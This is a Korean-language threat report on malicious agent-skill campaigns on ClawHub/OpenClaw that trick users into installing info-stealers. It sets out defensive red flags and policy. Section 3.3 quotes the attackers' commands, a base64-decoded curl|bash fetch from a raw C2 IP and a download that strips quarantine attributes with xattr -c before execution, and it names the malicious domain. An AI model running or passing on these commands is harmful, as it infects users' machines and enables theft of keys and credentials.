## 1. 개요 (Executive Summary)

ClawHub/ClawdBot(및 유사 에이전트/스킬 생태계)는 **스킬 문서(SKILL.md)**를 기반으로 설치·설정·운영 지시가 이루어지는 특성 때문에, 공격자가 **코드 취약점 없이도** 사용자를 설득해 “명령 실행”으로 감염을 유도하는 **사회공학형 공급망 공격**에 취약하다.

본 보고서는 OpenSourceMalware(OSM)가 공개한 두 개의 캠페인 분석을 중심으로 다음을 정리한다.

- **1차 파동(2026-01~02)**: 다수의 악성 스킬이 ClawHub 및 GitHub(오픈클로우 스킬 저장소)에 대량 등록되었고, 스킬 문서에 포함된 “필수 도구 설치” 유도를 통해 macOS/Windows에서 정보 탈취형 악성코드(예: NovaStealer 계열로 추정)를 설치하도록 설계되었다.
- **2차 진화(2026-02-09)**: 플랫폼의 스캐닝(예: VirusTotal) 회피를 위해 **SKILL.md 내부에서 악성 페이로드를 제거**하고, 대신 **그럴듯한 외부 웹사이트(예: Vercel 호스팅)**로 사용자를 리다이렉트해 악성 설치 명령을 제공하는 방식으로 발전했다. 결과적으로 **스킬 파일 자체는 “깨끗하게” 보이며** 정적 스캐닝만으로 탐지 난도가 상승한다.

## 2. 위협 모델 및 공격 표면

### 2.1 스킬(Agent Skill)의 구조적 리스크
- 스킬 설치/사용 과정에서 사용자가 SKILL.md 지시를 신뢰하는 경향이 크다.
- “필수 전제조건(prerequisite)” 형태로 **외부 바이너리 설치/스크립트 실행**을 유도할 수 있다.
- 스킬 플랫폼에 권한이 부여되면, 사용자 환경(파일/브라우저/키체인/SSH/클라우드 자격증명 등)과 연결되는 “**동의-권한 갭(consent gap)**”이 발생한다(사용자가 문서를 믿고 권한을 열어주는 순간이 취약점).

### 2.2 공격자 목표(Observed Objectives)
- 암호화폐 관련 고가치 정보: 거래소 API 키, 지갑 프라이빗 키/시드 구문, 브라우저 확장(예: Metamask) 데이터
- 개발자/운영자 자산: SSH 키, 클라우드 크레덴셜, `.env` 토큰, 브라우저 저장 비밀번호, macOS Keychain 등

## 3. 캠페인 1: “ClawdBot Skills Just Ganked Your Crypto” 요약 (2026-02-01)

### 3.1 타임라인(요지)
- **1차 그룹(초기)**: 2026-01-27 ~ 2026-01-29 사이 28개(초기 묶음) 공개
- **2차 그룹(대량)**: 2026-01-31 ~ 2026-02-02 사이 386개 대량 공개(블로그 업데이트 기준)
- 공통 C2 인프라: **91.92.242.30**

### 3.2 유포 방식(사회공학)
- 스킬 문서는 500~700줄 규모로 “정상적인 크립토 자동화 도구”처럼 구성
- 여러 구간에 반복되는 경고 박스(유니코드 박스 문자)로 **‘AuthTool/필수 도구 설치’**를 강하게 요구
- 사용자는 기능 활성화를 위해 “설치 커맨드/ZIP 다운로드”를 수행 → 감염

### 3.3 기술 분석(TTP)

#### macOS 대표 체인(내장 페이로드형)
- 예시 형태:
  - `echo <미끼 URL>`  
  - `echo '<base64>' | base64 -D | bash`
- 디코드 결과:
  - `/bin/bash -c "$(curl -fsSL http://91.92.242.30/<path>)"`
- 특징:
  - base64 난독화 + curl|bash 즉시 실행

#### macOS 대체 체인(axiom-agent 변형)
- 예시 형태:
  - `cd $TMPDIR && curl -O http://91.92.242.30/<bin> && xattr -c <bin> && chmod +x <bin> && ./<bin>`
- 특징:
  - `xattr -c`로 **Gatekeeper(검역 속성) 우회**
  - TMPDIR에서 실행(흔적 은닉/단기 실행)

#### Windows 체인
- GitHub Releases에서 ZIP 다운로드 → **비밀번호로 압축 해제** → EXE 실행
  - 예: `AuthTool.zip` / `PolymarketAuthTool.zip` 등
- 특징:
  - “패스워드 ZIP”은 자동 스캐닝/정적 검사 우회를 위해 자주 악용

### 3.4 악성코드(2단계) 관찰 포인트(요약)
- macOS 2단계 페이로드 예: Mach-O universal binary(x86_64/arm64)
- OSM은 샌드박스/동료 분석을 바탕으로 **NovaStealer 변종 가능성**을 언급

## 4. 캠페인 2: “Hide in Plain Sight” 진화 (2026-02-09)

### 4.1 핵심 변화: 페이로드 외부 호스팅
기존에는 악성 스킬이 SKILL.md에 base64 페이로드를 직접 포함했으나, 최신 캠페인은 다음처럼 바뀌었다.

- **SKILL.md 자체에는 악성 코드가 없음**
- 대신 “OpenClawCLI 설치가 필요” 같은 문구로 외부 사이트 링크 제공  
  - 예: `openclawcli[.]vercel[.]app`  
- 결과:
  - 스킬 파일은 VT/정적 스캐너에서 **정상(클린)**처럼 보임
  - 악성 페이로드는 외부 사이트에서 제공 → **플랫폼 스캔 회피**

### 4.2 ClawHub VirusTotal 스캐닝의 한계(관찰)
- ClawHub가 VT 스캔을 붙였더라도, “스킬 파일에 악성 문자열이 없으면” 탐지/경고 표시가 어렵다.
- 공격자는 “페이로드를 플랫폼 밖으로” 이동시켜 방어를 무력화한다.

### 4.3 케이스 스터디: thiagoruss0 + stveenli
- 계정 `thiagoruss0`에서 **37개** 악성 스킬, `stveenli`에서 **3개** 스킬이 동일한 외부 사이트로 유도(총 40개)
- 모두 같은 prerequisite 문구로 외부 사이트 설치를 유도

### 4.4 “공식 GitHub 백업 저장소” 문제
- `https://github.com/openclaw/skills` 가 사실상 ClawHub DB의 백업처럼 동작
- 레지스트리에서 악성 스킬을 제거해도 **GitHub repo에 남아** 클론 사용자에게 계속 유통될 수 있음
- 운영적으로 “레지스트리 + 미러/백업 저장소 + 캐시”를 함께 관리해야 하는 공급망 잔존성 이슈

### 4.5 외부 사이트가 제공하는 악성 설치 커맨드(전형)
- 사용자에게는 “설치 마법사 URL” 같은 미끼를 echo로 보여주고,
- 실제로는 base64 디코드 후 bash 실행
- 디코드 결과는 raw IP 기반 C2에서 payload fetch + 즉시 실행

## 5. Snyk 관점: “악성 Google 스킬 → OpenClaw 설치 유도” (연결고리)

Snyk는 ClawHub에 “Google 스킬”로 위장한 항목이 사용자에게 `openclaw-core` 같은 가짜 prerequisite 설치를 유도하고, 이를 통해 악성 페이로드 실행으로 이어지는 흐름을 강조했다.  
이는 OSM이 기술한 대량 캠페인의 “**사회공학형 prerequisite 설치 유도**” 패턴과 구조적으로 동일하며, 최근에는 (OSM 2/9 글처럼) **외부 사이트형으로 더 은밀해지는 추세**로 이해할 수 있다.

## 7. 레드플래그(즉시 차단/격리 기준)

다음 조건은 단독으로도 “고위험”으로 분류하는 것을 권고한다.

1. 스킬 문서가 **외부 바이너리/스크립트 설치**를 prerequisite로 요구

6. 랜덤 접미사/유사 복제 스킬명(대량 변종), 신규 계정, 오타스쿼팅

### 9.3 Snyk Labs Skill Inspector

## 10. 결론

OSM이 분석한 ClawHub/ClawdBot 캠페인은 “스킬 생태계”가 성숙하기 전에 공격자가 공급망을 선점하여 **대량 사회공학형 유포**를 수행할 수 있음을 보여준다.  
특히 2026-02-09 글에서 관찰된 **외부 호스팅형 진화**는 “스킬 파일 스캔”만으로는 방어가 어렵다는 점을 명확히 한다.

따라서 조직은 다음을 정책으로 정착시키는 것을 권고한다.

- (정책) 스킬 문서의 prerequisite 설치는 **화이트리스트 기반**으로 통제
- (기술) 정적 스캔 + 런타임(MCP) 프록시/관제 + 네트워크 차단을 결합
- (운영) 레지스트리 제거뿐 아니라 **공식 미러/백업 저장소까지** 유통 차단 범위를 확장

## 부록 B. 용어
- **Skill(에이전트 스킬)**: 에이전트가 사용할 수 있는 도구/프롬프트/연동 기능 묶음
- **MCP(Model Context Protocol)**: 에이전트가 외부 도구/서버와 상호작용하는 프로토콜(생태계별 구현 다양)
- **Consent gap**: 사용자가 기능 활성화를 위해 광범위한 권한/실행을 “동의”하지만, 실제 위험을 인지하지 못하는 간극
